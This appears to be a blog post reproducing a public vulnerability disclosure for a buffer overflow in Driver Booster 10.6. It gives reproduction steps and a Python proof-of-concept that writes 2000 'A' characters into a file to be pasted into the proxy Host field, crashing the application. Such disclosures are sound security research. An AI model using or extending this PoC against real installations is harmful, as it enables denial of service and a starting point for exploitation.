---
layout: post
title: Driver Booster 10.6 - Buffer Overflow (PoC)
date: 2023-09-10
category: exploit
---

# Exploit Title: Driver Booster 10.6 - Buffer Overflow (PoC)
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 10.09.2023
# Vendor Homepage: https://www.iobit.com
# Software Link: https://cdn.iobit.com/dl/driver_booster_setup.exe
# Tested Version: 10.6 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Open Driver Booster.
2. Click on **Settings** from the hamburger menu on the top left.
3. In the **Network** tab, check the **Customize proxy** box.
4. Paste the contents of `poc.txt` into the **Host** section and save.
5. The application crashes due to a buffer overflow.

### Proof of Concept (PoC)

The following script generates a `poc.txt` file containing 2000 "A" characters. When loaded into the **Host** field in Driver Booster, it causes the application to crash.

```python
#!/usr/bin/python

poc = 'A' * 2000

try:
    file = open("poc.txt", "w")
    file.write(poc)
    file.close()
    print("POC is created")
except Exception as e:
    print("POC is not created:", e)
